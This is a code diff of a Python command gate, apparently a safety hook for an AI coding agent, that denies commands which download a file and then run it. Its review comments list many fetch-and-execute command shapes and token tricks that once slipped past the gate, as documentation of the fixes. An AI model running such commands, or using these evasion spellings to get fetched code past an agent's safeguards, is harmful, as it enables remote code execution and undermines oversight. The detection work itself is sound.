+        # command joins it, and an empty spelling (the fold was a no-op) is
+        # skipped, so the ordinary install is scanned once.
+        for chunk in [_c for _c in _cmd_spellings(input_data) if _c]:
+            # [round-2 review] _scan_install_line returns (reason, names). It used
+            # to fold its three non-package refusals into the package-name
+            # string, so a piped remote script, an unverifiable requirements
+            # file and a package-index override all denied with
+            # "not in deps.md approved list: <package-index-override>" and
+            # told the operator to add that literal to deps.md - advice that
+            # cannot work, for a refusal that has nothing to do with the
+            # approved list. SEAM-CONTRACT §3.3 requires reason strings
+            # "semantically equivalent to the shell gates'", and the shell
+            # emits a distinct explanation for each of the three.
+            reason, names = _scan_install_line(chunk, approved)
+            if reason:
+                return _deny(reason)
+            blocked += names
+        if blocked:
+            return _deny("Dependency gate: not in deps.md approved list:"
+                         + blocked
+                         + "\\nApprove in-session and update "
+                           ".claude/steering/deps.md.")
+        return {}
+    return dependency_gate
+
+
+# [round-4 P3] The flag half comes from cmdpos.WRITER_FLAGS so the two
+# substrates read ONE list; `>`/`>>` are the operator spellings this set is
+# also used to test `prev` against. It used to be a second hand-written copy
+# of the shell's `case` arm.
+_WRITE_FLAGS = frozenset({">", ">>"}) | _WRITER_FLAGS
+
+
+def _download_then_run(cmd):
+    """Does this command download a file and then run it through an
+    interpreter? Shell parity (the gate's two-pass _dl_files walk).
+
+    Structural rather than textual: collect the paths a DOWNLOADER writes,
+    then look for an interpreter whose argument is one of them. Requiring both
+    halves is what keeps `curl -o out.json url` and `sh ./deploy.sh` allowed -
+    each is ordinary alone, and only the pair is an arrival channel.
+
+    [batch 30-33] The `extra` parameter is gone. It carried the files an
+    EXEMPTED pipe stage wrote, so the removed X-32 relaxation could not
+    launder fetched bytes through a file; with no exemption there is nothing
+    to carry, and the unconditional `_xp_chains` capture below - which has run
+    on every command since round-5 P3 - already collects those files.
+    """
+    # [X-32 repair F12] `>|` normalized to `>` before segmentation, and this
+    # half is what catches the DOWNLOADER'S OWN stage: `curl u >| a.sh |
+    # python3 -c 'x' ; sh a.sh` was deny at 2.6.1 and allow once the
+    # exemption existed, because the segmenter breaks on the `|` of `>|` and
+    # the target landed in a segment with no downloader in it. It closes a
+    # PRE-EXISTING gap in the same stroke (`curl u >| a.sh ; sh a.sh` is
+    # allow at 2.6.1 on both substrates) - fail-closed, and the alternative
+    # was to model one noclobber spelling in the exemption and leave the
+    # identical spelling open one rule down. Shell parity (the shell gate
+    # passes `${CMD//>|/>}` to cmd_segments).
+    # [round-5 P3] The chain walk below runs on the RAW command, BEFORE the
+    # three rewrites: `_xp_chains` parks `>&` under a sentinel rather than
+    # rewriting it, and reading `2>&1` as `2> 1` would put the DESCRIPTOR `1`
+    # into the write set as a file name. Measured: it denied the pinned
+    # `curl u.json | python3 -c 'x' 2>&1` data pipeline.
+    raw = cmd
+    cmd = cmd.replace(">|", ">")
+    # [round-4, found by the generated corpus] `>&` and `&>` are REDIRECTIONS,
+    # and the segmenter splits on `&` as a control operator - so
+    # `curl u >& a.sh` came apart and the target was never captured, though
+    # bash really does put the fetched BODY there (stdout AND stderr merged).
+    # The pipe walk has parked these since an earlier repair; this pass never
+    # did. Shell parity (`_D20CMD`).
+    cmd = cmd.replace("&>", "> ").replace(">&", "> ")
+    # [item 1 review, B2] `_lift_subs`, NOT `_shell_segments`. This was the one
+    # whole-command segmentation driver in this module the item-1 change did not
+    # convert, and its SHELL twin walks `cmd_segments "$_D20CMD"` (templates.py
+    # :4160 write pass, :4421 run pass), which gained the `_cs_subst_scan` seed.
+    # So the shell's D20 download-then-run correlation learned to see inside a
+    # `$(...)` and this one stayed blind: `echo "$(curl -o x.sh URL)" ; bash
+    # x.sh` was shell-deny / SDK-ALLOW - the direction this module's own binding
+    # rule forbids - on payloads that were allow/allow before item 1. Every half
+    # of the correlation can be hidden that way (the downloader, the
+    # interpreter, the redirect target, or both halves in separate
+    # substitutions), and `_cmd_word('"$(curl')` is not `curl`, so the write set
+    # stayed empty and this function returned False. Round-4 D8 is exactly this
+    # shape: the fix landing in the copies the gate does not use.
+    #
+    # [item 1 review, B2 round 2] `_expand_invoker_args`, and FLATTENED.
+    #
+    # `_lift_subs` alone is NOT the twin of `cmd_segments`. `cmd_segments` does
+    # two things - the `_cs_subst_scan` seed AND a depth-bounded drain that
+    # re-applies the invoker rule at every level - and `_lift_subs` only does
+    # the first. Without the invoker arm a substitution that is invisible in the
+    # raw command because it sits inside an invoker's SINGLE-quoted argument is
+    # never lifted, and `sh -c 'echo "$(curl -o x.sh URL)"' ; bash x.sh` stayed
+    # shell-deny / SDK-ALLOW - execution-proven RCE, the forbidden direction.
+    # `_scan_install_line`, this function's only caller, already spells it this
+    # way eleven lines below.
+    #
+    # FLATTEN, because the two substrates were handing their run scans the same
+    # segment in DIFFERENT SPELLINGS. `cmd_segments` glues a quoted run into one
+    # word with the `_CS_WS` sentinel; `_shell_segments` defaults to
+    # `flatten=False` and keeps real spaces. That mismatch was inert while the
+    # write set was empty, and lifting made it reachable: the lifted downloader
+    # puts its own `-o` target into `written`, the run pass then re-scans the
+    # OUTER segment, whose whitespace split still contains that file name as a
+    # bare token, and matches it as a file this command RUNS. A SELF-match
+    # against the download's own argument - `HTTP="$(curl -o /dev/null -s -w
+    # '%{http_code}' URL)"` denied with no interpreter anywhere in the command.
+    # Flattening restores the shell's spelling, so a quoted run is one token
+    # here exactly as it is there.
+    written = set()
+    segs = [_flatten_seg(_s)
+            for _s in _expand_invoker_args(_lift_subs(cmd, _CMD_OPS))]
+    # [round-5 P3] THE POST-DOWNLOAD PIPE STAGES, CAPTURED UNCONDITIONALLY.
+    #
+    # The X-32 write capture that makes a file "fetched-derived" used to run
+    # only when the broad pipe trigger had already matched a downloader
+    # followed by an INTERPRETER. With no interpreter anywhere in the pipeline
+    # the walk never ran, nothing was captured, and the later `sh f.sh` was
+    # judged as an ordinary command: `curl u | tee f.sh && sh f.sh` was allow
+    # on both substrates, and so were `| cat > f.sh`, `| dd of=f.sh` and
+    # `| sort -o f.sh` - every one of them a word set this batch admitted to
+    # INERT_FILTERS specifically so it WOULD be captured, on a path that never
+    # executed for them. The capture belongs to the download-then-run rule,
+    # which has both halves of the correlation, not to the exemption.
+    #
+    # `opaque` is the P3 fail-closed half: a post-download stage the walk
+    # cannot model wrote SOMEWHERE, and no capture rule can name it (`split -
+    # a.sh` writes `a.shaa`; `awk '{print > f}'` writes from inside its
+    # program). Recording nothing for it is the fail-OPEN reading. Instead the
+    # run scan is told, and it denies only if this same command also RUNS a
+    # file - a conjunction, so an ordinary `curl u | less` is untouched.
+    opaque = False
+    _chains = _xp_chains(raw)
+    if _chains is not None:
+        for _chain in _chains:
+            _seen = False
+            for _stage in _chain.split("|"):
+                _stage = _xp_unpark(_stage)
+                _stoks = _stage.split()
+                if _seen:
+                    _sf, _unmod = _xp_stage_writes(_stoks)
+                    written |= _sf
+                    if _unmod or _stage_head(_stoks) == "x":
+                        opaque = True
+                if any(_cmd_word(t) in _DOWNLOADERS for t in _stoks):
+                    _seen = True
+    for seg in segs:
+        toks = seg.split()
+        # [round-5 P1] _cmd_word, not a raw basename. `'curl'`, `"curl"`,
+        # `c''url`, `curl''` and `\\curl` all run curl and none of them matched
+        # _DOWNLOADERS here, so the write set stayed empty and this pass
+        # returned False while the emitted shell hook - whose tokenizer strips
+        # quotes - denied. SDK-more-permissive, 53 payloads, live RCE.
+        if not any(_cmd_word(t) in _DOWNLOADERS for t in toks):
+            continue
+        prev = ""
+        for tok in toks:
+            # [round-4 P2] _xp_key, the SAME canonicalizer the lookup pass
+            # below and both sides of the pipe walk use. The character-set
+            # lstrip that stood here was one of the two wrong spellings
+            # finding 7 measured.
+            #
+            # [round-4, found by the generated corpus] The arms are now the
+            # SAME four shapes _xp_stage_writes uses, and they were narrower
+            # here. So `curl u >& a.sh ; sh a.sh` - which really does put the
+            # fetched BODY in a.sh - captured nothing, and `curl u 2> a.sh`
+            # captured nothing. 138 of 5,986 generated payloads walked out
+            # through this pass alone, on BOTH substrates.
+            if (prev.endswith(">") or prev.endswith(">&")
+                    or prev in _WRITE_FLAGS):
+                _xp_cap(written, tok)
+            # [round-5 P3] The ATTACHED writer-flag spelling. `curl -oa.sh u ;
+            # sh a.sh` and `wget -Oa.sh u ; sh a.sh` were allow at 2.6.1 and
+            # here: one token, matching neither `prev in _WRITE_FLAGS` nor any
+            # other arm.
+            _wv = _writer_flag_value(tok)
+            if _wv:
+                _xp_cap(written, _wv)
+            if ">" in tok:
+                _xp_cap(written, tok.rsplit(">", 1)[-1])
+            prev = tok
+    if not written and not opaque:
+        return False
+    for seg in segs:
+        if _xp_run_scan(seg.split(), written, opaque):
+            return True
+    return False
+
+
+def _redirect_norm(cmd):
+    """[round-5 P1] Every operator spelling whose characters collide with the
+    two the splitters break on, made ordinary. `|&` is a PIPE and `2>&1` is a
+    redirect, and the `&` in each stopped the trigger's `[^;&]*` window - so
+    `curl url |& sh` and `curl url 2>&1 | sh` matched nothing and ran the
+    fetched bytes. Reference: cmdpos.redirect_norm; shell parity (`_RCMD`)."""
+    return (cmd.replace(">|", ">").replace("|&", "|")
+               .replace("&>", "> ").replace(">&", "> "))
+
+
+def _writer_flag_value(tok):
+    """[round-5 P3] The write target GLUED to a writer flag, or "".
+    Reference: cmdpos.writer_flag_value; cmdpos.WRITER_ATTACHED_VECTORS pins
+    every row.
+
+    `cmdpos.WRITER_FLAGS` was consulted only in the SEPARATE-token shape
+    (`prev in _WRITE_FLAGS`), so `sort -oa.sh` and `sort --output=a.sh` matched
+    no arm at all - not the tee arm, not `prev`, not `of=`, not `>` - and the
+    file that stage wrote never entered the write set while the same command's
+    `sh a.sh` ran it. `sort` is on INERT_FILTERS BECAUSE its write channel was
+    claimed covered; the pin exercised only the separated forms, so the claim
+    and the test agreed with each other and not with the binary.
+    """
+    for f in _WRITER_FLAGS:
+        if f.startswith("--"):
+            if tok.startswith(f + "="):
+                return tok[len(f) + 1:]
+        elif len(tok) > len(f) and tok.startswith(f):
+            return tok[len(f):]
+    return ""
+
+
+def _xp_meta_pieces(tok):
+    """One token, split again once shell metacharacters are blanked.
+
+    [round-4 P1(d), finding 19] `eval "$(cat b.sh)"` reaches the run scan as
+    the SINGLE token `$(cat<WS>b.sh)` - the segmenter folds a quoted run into
+    one token with its spaces replaced by the in-quote sentinel - so no whole
+    token ever equals the fetched file's name. Blanking `$()`, the quotes, the
+    control operators and the sentinel recovers `b.sh`. Only reachable under
+    an INVOKER command word, which is what bounds the over-match. Shell parity
+    (_xp_meta_hit).
+    """
+    out = tok
+    for c in ("$", "(", ")", "`", "'", '"', chr(92), ";", "&", "|",
+              "<", ">", "{", "}", _XP_WS):
+        out = out.replace(c, " ")
+    return out.split()
+
+
+def _xp_run_scan(toks, written, opaque=False):
+    """[round-4 P1(d)] Does this segment RUN one of the written files? Shell
+    parity (_xp_run_scan in the emitted hook).
+
+    [round-5 P3] `opaque` says a post-download stage wrote a file this model
+    cannot NAME (`split - a.sh` writes `a.shaa`; `awk '{print > f}'` writes
+    from inside its program; `cp`, `install`, `rsync` and every unadmitted
+    binary write through channels the four-shape capture does not see). With
+    no name there is no key, and "no key" was being read as "nothing was
+    written" - the fail-OPEN reading of an unmodellable stage that P3 exists to
+    invert. When it is set, RUNNING ANY FILE AT ALL is the deny: the command
+    both fetched bytes through something unmodellable and executed a script,
+    and this walk cannot rule out that they are the same bytes. It is a
+    CONJUNCTION on purpose - `curl u | less` alone is untouched - and the cost
+    is recorded: `curl u | less ; python3 app.py` now refuses.
+
+    This pass used to be `if the segment's FIRST word is an interpreter`. One
+    transparent word made the whole segment invisible to the only guard
+    standing between fetched bytes and execution: `; env sh a.sh`, `; sudo sh
+    a.sh`, `; timeout 5 sh a.sh`, `; nohup sh a.sh`, `; . a.sh`, `; source
+    a.sh` and `; chmod +x a.sh && ./a.sh` were ALL rc=0 on both substrates
+    against a file the same command had just written from a fetch (finding 4;
+    every one rc=2 at 2.6.1, three of them executed live RCE). It
+    simultaneously nullified four earlier repairs - tee, sponge, `dd of=`,
+    `>|` and every quote spelling were faithfully collected into the write set
+    and then never consulted.
+
+    THIS WALK GRANTS DENIES, so it takes cmdpos.py's UNBOUNDED walker rule and
+    over-consumption is the safe direction - the exact inverse of the
+    head walk in _stage_head, which grants a stage the MODELLABLE reading and
+    therefore may skip prefixes and assignments ONLY. Both rules are written
+    at their call sites because getting them the wrong way round is what F5
+    and D9 each were. [batch 30-33] The inverse used to be named as the X-32
+    exemption's head walk; that walk is gone and _stage_head is where the rule
+    now lives.
+    """
+    def hit(tok):
+        key = _xp_key(tok)
+        return bool(key) and key in written
+
+    # Phase 1 - the head prefix run and the command word. Every token of the
+    # prefix run is itself keyed: a cheap over-match that closes
+    # `sudo -u a.sh cat`, where the FLAG'S OPERAND is the fetched file.
+    pfx = fwd = False
+    cw, i = "", 0
+    # [issue #50] The TENTATIVE command word: what the ordinary-word branch
+    # below resolves by reducing a version suffix. It is held aside rather
+    # than assigned to `cw` because it must not end this walk - it is applied
+    # only after phase 2 has failed to find anything, so resolving a word here
+    # can never cost the deeper invoker the walk would otherwise have reached.
+    cw0, i0 = "", 0
+    while i < len(toks):
+        t = toks[i]
+        # [round-5 P1] _cmd_word, not a raw basename. bash removes quote
+        # characters and backslashes before it looks at the word, so a
+        # backslash-escaped `sh`, `bash`, `source`, `.`, an interior-escaped
+        # `c<bs>url` and a quoted `'sh'` each ran a
+        # file this same command had just fetched while this walk matched
+        # nothing at all. THIS WALK GRANTS DENIES, so reducing to the executed
+        # spelling can only find MORE - the exact inverse of `_stage_head`,
+        # where the raw token is deliberate because a quoted head must be
+        # unmodellable.
+        base = _cmd_word(t)
+        # A file runner ENDS the prefix run. `.` and `source` are here and NOT
+        # in the forward scan below: they are builtins no wrapper can exec, so
+        # honouring them deeper would resolve `env jq . x.json` to `.` and
+        # deny an ordinary jq invocation.
+        #
+        # [issue #50] THIS ARM IS DELIBERATELY UNTOUCHED - no version
+        # reduction, no `hit(t)`, no opaque path-form test. It is the FIRST
+        # test in phase 1, ahead of the assignment, prefix, compound-head and
+        # flag arms, so a token reaching it has NOT yet been shown to be a
+        # command word. It fires on genuine ones - `sh a.sh` at a segment head
+        # is the common case - but `A=/x/python3.12` and
+        # `-X/usr/bin/python3.12` are tested HERE too, before the arm that
+        # would have recognised either for what it is. Reducing here therefore
+        # resolves an interpreter out of an ASSIGNMENT VALUE, an ATTACHED FLAG
+        # VALUE or a WRAPPER OPERAND:
+        # `A=/x/python3.12 sh -c "$(cat b.sh)"` would stop at the assignment
+        # and never walk on to `sh`, and `A=/x/python3.12` is an inert
+        # assignment naming no real file - a one-token, attacker-chosen
+        # disarm prependable to any laundered payload. MEASURED, by building
+        # that variant and diffing it against this tree: on a 240-row disarm
+        # matrix (3 downloads x 16 disarms x 5 invokers) it goes deny -> allow
+        # on 120 rows here, 168 in the planning phase and 180 for an
+        # adversarial reviewer who built his own matrix - against 0 for this
+        # tree on all three. THE COUNT IS CORPUS-SENSITIVE AND DOES NOT
+        # TRAVEL; the DISARM LIST does, and every member of it opens the
+        # payload: `A=/x/python3.12`, `PYTHONPATH=/opt/python3.12`,
+        # `sudo -X/usr/bin/python3.12`, `env -u/x/python3.12`,
+        # `timeout 5 /opt/perl5`. Compensating with guards here is worse
+        # still: this arm fires on EXACT members too, so `hit(t)` and the
+        # opaque test would fire on every ordinary `/bin/bash -l` after a
+        # download - the planning phase measured that variant at 83 of 112
+        # realistic fetch-then-use commands refused, and that figure is
+        # carried from it, not re-run here. The reduction is read in
+        # the ordinary-word branch below instead, where both tests already
+        # apply and no token that is not a command word can reach it.
+        #
+        # The `break` before `hit(t)` also makes the EXACT member spelling
+        # more permissive than the versioned one (`curl -o python3 u ;
+        # ./python3 app.py` is allow/allow while its `python3.12` twin is
+        # deny/deny), which is a PRE-EXISTING defect, not issue #50's, and is
+        # backlogged with its measured fix rather than smuggled in here.
+        if base in _FILE_RUNNERS:
+            cw, i = base, i + 1
+            break
+        # A COMPOUND HEAD or shell KEYWORD opens a command position too -
+        # which is why cmdpos.anchor_regex has had a KEYWORDS arm since round
+        # 2. [round-4, found by the generated corpus] Without it the segmenter
+        # hands this walk ` then sh a.sh ` and ` { sh a.sh `, whose FIRST
+        # token is `then`/`{`; that was read as an ordinary command word, the
+        # walk stopped, and `sh a.sh` was never examined. 167 of 3,217
+        # generated payloads walked out this way - finding 18's class on the
+        # RUN side rather than the pipe-stage side.
+        if (re.match(r"[A-Za-z_][^ ]*[+]?=", t) or base in _CMD_PREFIXES
+                or t in _COMPOUND_HEADS):
+            if hit(t):
+                return True
+            pfx, i = True, i + 1
+            continue
+        if pfx and t.startswith("-"):
+            if hit(t):
+                return True
+            i += 1
+            continue
+        # The first ordinary word. With no prefix in front it IS the command
+        # word - which is what closes a bare `./a.sh` and `a.sh` after
+        # `chmod +x`, because the file the command runs is the command word.
+        if hit(t):
+            return True
+        # [round-5 P3] ...and under `opaque` a PATH-FORM command word is the
+        # "runs a file" half on its own. bash executes a file directly ONLY
+        # when the command word contains a slash (otherwise it is a PATH
+        # lookup of a binary), so this is the tightest test that still catches
+        # `curl u | awk '{print > "f.sh"}' ; ./f.sh` - found by the round-5
+        # corpus, not by a report, and the one runner spelling that reaches no
+        # FILE_RUNNER and so never sets `cw` below.
+        if opaque and "/" in t:
+            return True
+        # [issue #50] `curl -o a.sh u ; python3.12 a.sh` ran a file this same
+        # command had just fetched while `python3 a.sh` denied: the run side
+        # tested EXACT membership where the pipe side has applied
+        # cmdpos.INTERP_SUFFIX since finding 9. It was never python-specific -
+        # `perl5.36`, `ruby3.2`, `node20`, `php8.2`, `bash5`, path-qualified
+        # `/usr/bin/python3.12` and quoted/escaped `'python3.12'`,
+        # `pyth\\on3.12` all walked through, 16 real spellings in all, and
+        # `env python3.12 a.sh` already DENIED because the wrapper branch
+        # reaches the suffix-aware answer. Joining the run side to the
+        # EXISTING reduction is the whole fix; INTERP_SUFFIX itself is
+        # untouched (widening it is X-36i, blocked behind X-36a).
+        #
+        # THE POSITION IS THE DESIGN. This is the branch a token reaches only
+        # after the assignment, prefix, compound-head and flag arms have all
+        # declined it, so it can only ever see a word that IS in command
+        # position - which is why the reduction can be read here and not at
+        # the _FILE_RUNNERS arm above (see the note there for the 120-of-240
+        # deny -> allow measurement). It is also why no guard is needed:
+        # `hit(t)` and the opaque path-form test are the two statements
+        # immediately above, so a reduced word is already subject to both.
+        # Nothing moves OFF a test it was taking; the reduction only supplies
+        # a command word where this walk had none.
+        cw0, i0 = _int_word(base), i + 1
+        fwd, i = pfx, i + 1
+        break
+    # Phase 2 - the UNBOUNDED forward scan, opened ONLY by a prefix run. With
+    # a wrapper word at the head there is no arity table that can separate
+    # `sudo -u nobody sh a.sh` from `sudo nobody sh a.sh`, so the walk keeps
+    # looking for a runner rather than stopping at the first operand - AND
+    # KEYS EVERY TOKEN ON THE WAY.
+    #
+    # [round-4, found by the generated corpus, not by any report] Scanning for
+    # a runner alone is not enough, because the thing being run need not BE a
+    # runner: `sudo -u root ./a.sh`, `nice -n 5 . a.sh` and
+    # `timeout -k 1 -s KILL 5 source a.sh` put the fetched file itself where
+    # the command word would be, behind a wrapper flag whose arity nothing
+    # here knows. 259 of 5,986 generated payloads walked out that way. Keying
+    # every token is the fail-closed reading of the same ambiguity phase 1
+    # already resolves that way, and the cost is recorded: an ordinary reader
+    # behind a prefix (`curl -o x.json u ; env jq . x.json`) now refuses.
+    if fwd:
+        while i < len(toks):
+            if hit(toks[i]):
+                return True
+            base = _cmd_word(toks[i])
+            if base in _INTERPRETERS:
+                cw, i = base, i + 1
+                break
+            # [issue #50] The same exact-membership gap, one phase deeper:
+            # `sudo -u x bash5.2 -c "$(cat b.sh)"` is a versioned INVOKER
+            # behind a wrapper, and phase 1 alone leaves it open.
+            #
+            # `_INT_INVOKERS`, NOT `_SHELL_INVOKERS`: this arm asks "is the
+            # reduced word one of the SHELLS WITHIN _INTERPRETERS", which is
+            # cmdpos.INVOKERS - the one definition the shell twin's
+            # `@@SHELL_INT_CASE@@` is rendered from, so the two arms are one
+            # spelling. Spelling it `_SHELL_INVOKERS` (= ALL_INVOKERS) would
+            # have named the three DUAL words too, and a set the arm cannot
+            # reach is how the substrates drift without a verdict moving.
+            # tests/test_issue_fixes.py pins the two arms' word sets equal.
+            run = _int_word(base)
+            if run in _INT_INVOKERS:
+                cw, i = run, i + 1
+                break
+            # A reduced NON-invoker is REMEMBERED, not taken. Stopping the
+            # scan on it would drop a deeper invoker the base walk reached -
+            # `sudo x /opt/perl5 sh -c "$(cat b.sh)"` must still resolve to
+            # `sh`, not to `perl`. It is applied below only if the scan
+            # exhausts, which is exactly the state in which the base walk had
+            # no command word at all.
+            if run and not cw0:
+                cw0, i0 = run, i + 1
+            i += 1
+    # [issue #50] The tentative applies ONLY if nothing deeper was found, so
+    # this arm is reachable only where the base walk fell out of both phases
+    # with `cw` empty and therefore returned False outright. That is what
+    # makes the join CONVERGENT rather than a re-routing: it adds a phase 3
+    # where there was none, and never replaces one. Measured 0 deny -> allow
+    # over 338,688 generated commands on this substrate, exhaustively, and
+    # over a 6,000-row sample on the shell (see the freeze exception for the
+    # corpus definition - the number means nothing without it).
+    if not cw and cw0:
+        cw, i = cw0, i0
+    # Phase 3 - what the resolved command word does with the rest.
+    if not cw:
+        return False
+    # [round-5 P3] An UNNAMEABLE write upstream plus a file run here is the
+    # fail-closed reading of a stage the model cannot interpret. `cw` is set
+    # only for a FILE_RUNNER or an interpreter behind a prefix run, and one
+    # non-flag operand is required, so a bare interactive `sh` does not trip it.
+    if opaque and any(not t.startswith("-") for t in toks[i:]):
+        return True
+    if cw in _SHELL_INVOKERS:
+        # An INVOKER's argument is a command line, so every token counts - and
+        # so does every piece of it once metacharacters are blanked.
+        for t in toks[i:]:
+            if hit(t) or any(hit(p) for p in _xp_meta_pieces(t)):
+                return True
+        return False
+    for t in toks[i:]:
+        if not t.startswith("-") and hit(t):
+            return True
+    return False
+
+
+# [X-32 repair F8] The metacharacters that make a head token UNMODELLABLE.
+# chr(92) is a backslash - spelling it inline would need four levels of
+# escaping inside this generator's own string literal.
+#
+# [X-32 repair F9] `;` and `|` are in the set. Neither can reach a head
+# token as ordinary text - unquoted, they are the separators the walk
+# splits on - so the only way one arrives is backslash-escaped, and
+# _xp_unpark hands the operator back WITHOUT its backslash, which would
+# otherwise have been the metacharacter that caught it. Shell parity.
+_XP_META = frozenset("<>(){}`$&;|" + chr(92) + "'" + '"')
+
+
+def _xp_normpath(p):
+    """[X-32 repair F3] Textual path canonicalization. Shell parity
+    (_xp_normpath in the emitted hook); reference cmdpos.xp_normpath.
+
+    It arrived for the `/dev/stdin`-family guard that fenced the X-32
+    exemption, because that guard enumerated four SPELLINGS with no
+    normalization and `/dev/./stdin`, `/dev//stdin`, `/dev/fd//0` and
+    `/dev/fd/./0` walked straight past it. [batch 30-33] THAT GUARD IS GONE
+    WITH THE EXEMPTION, and `_xp_key` is the remaining consumer: the D20
+    write set is a set of PATHS rather than a set of strings because this
+    function is applied to both ends of it. Empty and `.` segments drop out
+    and `seg/..` resolves, which is what makes `tee ././a.sh ... ; sh a.sh`
+    and `tee a.sh ... ; sh .//a.sh` name one file on both substrates.
+    """
+    lead = "/" if p.startswith("/") else ""
+    out = []
+    for seg in p.split("/"):
+        if seg in ("", "."):
+            continue
+        if seg == "..":
+            if out and out[-1] != "..":
+                out.pop()
+            else:
+                out.append("..")
+        else:
+            out.append(seg)
+    return lead + "/".join(out)
+
+
+# [X-32 repair F9] A control operator that is QUOTED or ESCAPED is not a
+# separator. Each one is parked under a sentinel byte across the split and
+# handed back per STAGE. Shell parity (_XP_SEMI/_XP_AMP/_XP_BAR/_XP_NL and
+# _XP_BS/_XP_DQ/_XP_SQ in the emitted hook).
+# chr(92)/chr(39) rather than an inline literal for the backslash and the
+# single quote, the same reason _XP_META gives above: spelling either one
+# inline needs four levels of escaping inside this generator's own string.
+_XP_QUOTES = ('"', chr(39))
+_XP_PARK = {";": "\\x0e", "&": "\\x0f", "|": "\\x10", "\\n": "\\x11",
+            chr(92): "\\x12", '"': "\\x13", chr(39): "\\x14"}
+_XP_UNPARK = tuple((v, k) for k, v in _XP_PARK.items()) + (("\\x01", "&"),)
+
+
+def _xp_park(cmd):
+    """[X-32 repair F9] -> (parked, ok). Shell parity (_xp_park).
+
+    [kept at batch 30-33 as deny-direction hardening for the UNRELAXED
+    rule] THE CHAIN SPLITTER MUST NOT BE QUOTE-BLIND, or every guard in the
+    post-download stage walk becomes unreachable on any command whose quoted
+    text carries a control operator. A bare re.split has no idea what is
+    quoted, so a `;`, `&` or newline INSIDE A QUOTED ARGUMENT severs the
+    pipeline: the chain ends early, every stage after the operator lands in
+    a chain with `seen_dl` False, and the post-download write capture NEVER
+    EXAMINES it.
+
+    Measured on this tree, with the X-32 exemption already gone:
+    `curl u | jq -r '.a;.b' | tee f.sh ; sh f.sh` is DENY with this split
+    and ALLOW with a quote-blind one - the fetched bytes reach `f.sh` and
+    the same command runs it. So this is a FAIL-OPEN repair that now guards
+    the rule at its strictest setting, not a leftover of the relaxation.
+    Same failure MODE as repair F1, one character over: F1 considered `&`
+    inside a REDIRECT and never considered `;`/`&`/newline inside a quoted
+    argument.
+
+    PARSED, not refused, and that is the one place here where the
+    fail-closed reflex is wrong - on its own terms, not on the removed
+    exemption's. A quoted control operator is ORDINARY in an argument
+    (`jq -r '.a;.b'`, `awk 'BEGIN{x=1;y=2}'`, `sed 's/a/b/;s/c/d/'`), and
+    the `bad` posture here would refuse every one of them the moment a
+    downloader appeared anywhere in the command - a large over-refusal that
+    buys nothing, because a downloader piped into an INTERPRETER is already
+    an unconditional deny at the trigger. It would cost exactly
+    `curl u | jq -r '.a;.b' > out.json`, the shape issue #32 was filed
+    about. The one input that IS refused is an unterminated quote, which has
+    no shell parse at all.
+
+    Escapes are parked FIRST, because a backslash-escaped `;` is a literal
+    semicolon with no quote around it at all, and a run whose closing quote
+    is itself backslash-escaped is ONE word whose `;` a quote-only scanner
+    reads as unquoted. (Both spellings are pinned in tests/
+    test_issue_fixes.py; they are not written here, because a backslash in
+    this docstring is an escape sequence in the emitted module.)
+    """
+    for park in _XP_PARK.values():        # the sentinels are ours: a raw
+        cmd = cmd.replace(park, " ")      # one could otherwise forge a
+    cmd = cmd.replace("\\x01", " ")        # non-split
+    out, i, n = [], 0, len(cmd)
+    while i < n:                          # phase 1: backslash escapes
+        c = cmd[i]
+        if c != chr(92):
+            out.append(c)
+            i += 1
+            continue
+        nxt = cmd[i + 1] if i + 1 < n else ""
+        if nxt == "\\n":                   # a line continuation: both vanish
+            pass
+        elif nxt in _XP_PARK:
+            out.append(_XP_PARK[nxt])
+        elif nxt == "":
+            out.append(c)                 # trailing backslash escapes nothing
+        else:
+            out.append(c)
+            out.append(nxt)
+        i += 2
+    s = "".join(out)
+    res, i, n = [], 0, len(s)
+    while i < n:                          # phase 2: quoted runs
+        c = s[i]
+        if c not in _XP_QUOTES:
+            res.append(c)
+            i += 1
+            continue
+        j = s.find(c, i + 1)
+        if j < 0:
+            return "", False              # unterminated: no shell parse
+        run = s[i + 1:j]
+        for raw in (";", "&", "|", "\\n"):
+            run = run.replace(raw, _XP_PARK[raw])
+        res.append(c + run + c)
+        i = j + 1
+    return "".join(res), True
+
+
+def _xp_unpark(stage):
+    """Sentinels back to the bytes they stood for, per STAGE. Parking is a
+    transport across the split, never an exemption: `| 'sh'` must still
+    reach _stage_head with its quotes on. Shell parity (_xp_unpark)."""
+    for park, raw in _XP_UNPARK:
+        stage = stage.replace(park, raw)
+    return stage
+
+
+def _xp_chains(cmd):
+    """[X-32 repair F1] Split on the CONTROL operators only, and only on
+    the UNQUOTED ones [F9]. -> list of chains, or None when the command
+    cannot be parsed at all. Shell parity.
+
+    `&` is a chain separator AND the fd-duplication marker inside `2>&1`,
+    `1>&2`, `>&2`, `&>f`. Splitting on every `&` severed the pipeline:
+    `curl u | python3 -c p 2>&1 | sh` became `curl u | python3 -c p 2>`
+    (which earned the X-32 exemption, back when there was one) plus
+    `1 | sh` (no downloader, so the terminal shell was never examined) -
+    allow, for a command the real shell still builds as three stages. An `&` ADJACENT to `<`/`>` belongs to the
+    redirect and is parked under a sentinel byte across the split, then
+    restored; `|&` is a PIPE and becomes one. `||` is deliberately NOT
+    split: bash binds it to the whole PIPELINE, so `curl u | python3 -c x
+    || sh` really is a stage list ending in a shell (deny, as at 2.6.1),
+    while splitting there would have made `curl u || python3 -c x` a chain
+    with no downloader and denied an ordinary fallback.
+    """
+    s, ok = _xp_park(cmd)
+    if not ok:
+        return None
+    # [X-32 repair F12] `>|` IS A REDIRECT, NOT A PIPE. bash's noclobber
+    # override is spelled with the pipe character and the stage split below
+    # breaks on every `|`, so `python3 -c 'x' >| a.sh` became the stage
+    # `python3 -c 'x' >` (whose rsplit(">")[-1] is the empty string,
+    # discarded) plus a fresh stage `a.sh` read as an ordinary command word.
+    # The target never entered the write set, so `curl u | python3 -c 'x'
+    # >| a.sh ; sh a.sh` was allow on both substrates - rc=2 at 2.6.1, i.e.
+    # a channel this exemption OPENED. `|&` is special-cased one line down
+    # for the mirror-image reason and `>|` was simply missed. NORMALIZED to
+    # `>` rather than parked: they are the same redirect operator (only
+    # noclobber differs, which this walk does not model), so every guard
+    # that already reads `>` reads this too, with no unpark spelling to keep
+    # in sync. `> |` with a space is a bash syntax error, so the
+    # two-character sequence is unambiguous, and a `>|` inside a quoted run
+    # is untouched because _xp_park already replaced its `|` with a
+    # sentinel. Before the `|&`/`&>` rules so `&>|f` reduces in one step.
+    # Shell parity (the same five rewrites, in the same order, at the head of
+    # the emitted hook's `pipe_stage_writes`). [batch 30-33] The removed X-32
